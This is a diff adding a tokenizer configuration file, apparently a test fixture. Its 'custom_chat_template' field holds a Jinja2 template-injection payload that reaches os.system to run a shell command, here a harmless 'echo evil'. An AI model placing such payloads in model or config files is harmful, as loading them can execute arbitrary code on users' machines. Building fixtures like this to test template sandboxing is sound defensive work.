@@ -1,0 +1,6 @@
+{
+  "tokenizer_class": "DistilBertTokenizer",
+  "chat_template": "{% for message in messages %}{{ message['role'] }}: {{ message['content'] }}\\n{% endfor %}",
+  "custom_chat_template": "{{ self.__init__.__globals__['os'].system('echo evil') }}",
+  "model_max_length": 512
+}
